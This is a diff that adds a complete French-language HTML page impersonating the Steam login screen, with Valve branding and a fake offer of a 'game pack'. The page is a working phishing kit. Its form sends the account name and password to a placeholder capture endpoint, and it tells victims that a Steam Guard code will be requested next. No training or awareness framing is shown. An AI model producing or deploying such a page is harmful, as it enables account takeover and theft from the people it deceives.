@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Steam - Connexion</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, 'Segoe UI', Arial, sans-serif;
+    background: #1b2838;
+    color: #c7d5e0;
+    min-height: 100vh;
+  }
+  .header {
+    background: #171a21;
+    padding: 12px 16px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .logo {
+    font-weight: 700;
+    font-size: 20px;
+    color: #fff;
+    letter-spacing: 0.5px;
+  }
+  .logo span { color: #66c0f4; }
+  .container {
+    max-width: 420px;
+    margin: 40px auto;
+    padding: 0 20px;
+  }
+  .card {
+    background: #16202d;
+    border: 1px solid #2a3f5a;
+    border-radius: 6px;
+    padding: 28px 22px;
+  }
+  h1 {
+    font-size: 19px;
+    font-weight: 500;
+    margin-bottom: 6px;
+    color: #fff;
+  }
+  .sub {
+    font-size: 13px;
+    color: #8f9aa8;
+    margin-bottom: 22px;
+    line-height: 1.4;
+  }
+  label {
+    display: block;
+    font-size: 12px;
+    color: #8f9aa8;
+    margin-bottom: 5px;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+  input {
+    width: 100%;
+    padding: 11px 12px;
+    margin-bottom: 16px;
+    background: #2a3f5a;
+    border: 1px solid #3a516e;
+    border-radius: 4px;
+    color: #fff;
+    font-size: 15px;
+  }
+  input:focus {
+    outline: none;
+    border-color: #66c0f4;
+  }
+  .btn {
+    width: 100%;
+    padding: 13px;
+    background: linear-gradient(90deg, #47bfff 0%, #1a44c2 100%);
+    border: none;
+    border-radius: 4px;
+    color: #fff;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+  }
+  .btn:active { opacity: 0.85; }
+  .steamguard {
+    margin-top: 18px;
+    padding-top: 16px;
+    border-top: 1px solid #2a3f5a;
+    font-size: 12.5px;
+    color: #8f9aa8;
+    line-height: 1.5;
+  }
+  .steamguard b { color: #66c0f4; font-weight: 500; }
+  .footer {
+    text-align: center;
+    font-size: 11px;
+    color: #56646f;
+    margin-top: 26px;
+    line-height: 1.6;
+  }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="logo">STEAM<span>®</span></div>
+</div>
+
+<div class="container">
+  <div class="card">
+    <h1>Connexion à Steam</h1>
+    <p class="sub">Connectez-vous pour accéder à votre compte et récupérer votre pack de jeux.</p>
+
+    <form action="https://ton-endpoint.ici/capture" method="POST">
+      <label>Nom du compte Steam</label>
+      <input type="text" name="username" placeholder="Votre identifiant" autocomplete="off" required>
+
+      <label>Mot de passe</label>
+      <input type="password" name="password" placeholder="Votre mot de passe" required>
+
+      <button type="submit" class="btn">Se connecter</button>
+    </form>
+
+    <div class="steamguard">
+      <b>Steam Guard</b><br>
+      Pour finaliser la récupération de votre pack, un code de confirmation vous sera demandé après connexion.
+    </div>
+  </div>
+
+  <div class="footer">
+    © Valve Corporation. Tous droits réservés.<br>
+    Steam et le logo Steam sont des marques de Valve Corporation.
+  </div>
+</div>
+
+</body>
+</html>
